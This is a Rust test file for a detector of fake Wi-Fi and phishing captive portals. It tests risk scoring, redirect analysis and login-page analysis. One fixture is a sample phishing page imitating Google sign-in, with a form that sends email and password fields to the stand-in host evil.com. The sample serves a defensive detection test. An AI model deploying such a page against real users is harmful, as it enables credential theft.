use fakewifi_detector_lib::login_analyzer::LoginPageAnalyzer;
use fakewifi_detector_lib::probe::ProbeEngine;
use fakewifi_detector_lib::redirect::RedirectAnalyzer;
use fakewifi_detector_lib::scoring::{RiskEngine, RiskLevel, ScoringInput};

#[test]
fn test_full_pipeline_safe_network() {
    let engine = RiskEngine::new();
    let input = ScoringInput {
        invalid_ssl: false,
        hostname_mismatch: false,
        suspicious_redirect: false,
        phishing_login_page: false,
        is_trusted_network: true,
        redirect_count: 0,
        http_downgrade: false,
        self_signed_cert: false,
        suspicious_branding: false,
        hidden_form_inputs: false,
    };
    let result = engine.evaluate(&input);
    assert_eq!(result.risk_level, RiskLevel::Safe);
    assert_eq!(result.total_score, 0);
}

#[test]
fn test_full_pipeline_critical_network() {
    let engine = RiskEngine::new();
    let input = ScoringInput {
        invalid_ssl: true,
        hostname_mismatch: true,
        suspicious_redirect: true,
        phishing_login_page: true,
        is_trusted_network: false,
        redirect_count: 3,
        http_downgrade: true,
        self_signed_cert: true,
        suspicious_branding: true,
        hidden_form_inputs: true,
    };
    let result = engine.evaluate(&input);
    assert_eq!(result.risk_level, RiskLevel::Critical);
    assert!(result.total_score > 100);
    assert!(!result.breakdown.is_empty());
}

#[test]
fn test_probe_engine_creation() {
    let engine = ProbeEngine::new();
    let results = engine.probe_all();
    assert!(!results.is_empty());
    assert!(results.iter().any(|r| r.probe_target.contains("http")));
}

#[test]
fn test_redirect_analyzer_no_redirect() {
    let analyzer = RedirectAnalyzer::new();
    let result = analyzer.analyze("https://example.com/");
    assert!(!result.suspicious);
    assert_eq!(result.redirect_count, 0);
    assert_eq!(result.final_url, "https://example.com/");
}

#[test]
fn test_login_analyzer_phishing_page() {
    let analyzer = LoginPageAnalyzer::new();
    let html = r#"<html>
        <head><title>Google Sign In</title></head>
        <body>
            <form action="https://evil.com/login" method="POST">
                <input type="hidden" name="token" value="abc">
                <input type="hidden" name="return" value="xyz">
                <input type="hidden" name="id" value="123">
                <input type="text" name="email" placeholder="Email">
                <input type="password" name="pass" placeholder="Password">
                <button type="submit">Verify Now</button>
            </form>
        </body>
    </html>"#;

    let result = analyzer.analyze(html, "http://192.168.1.1/login");
    assert!(result.is_login_page);
    assert!(result.has_password_field);
    assert!(!result.uses_https);
    assert!(!result.domain_consistent);
    assert!(result.has_suspicious_branding);
    assert!(result.has_hidden_inputs);
    assert!(!result.suspicious_indicators.is_empty());
}

#[test]
fn test_scoring_breakdown_accuracy() {
    let engine = RiskEngine::new();
    let input = ScoringInput {
        invalid_ssl: true,
        hostname_mismatch: true,
        suspicious_redirect: false,
        phishing_login_page: false,
        is_trusted_network: false,
        redirect_count: 0,
        http_downgrade: false,
        self_signed_cert: false,
        suspicious_branding: false,
        hidden_form_inputs: false,
    };
    let result = engine.evaluate(&input);
    assert_eq!(result.total_score, 75);
    assert_eq!(result.breakdown.len(), 2);
    assert!(result.breakdown.iter().any(|b| b.factor.contains("SSL")));
}
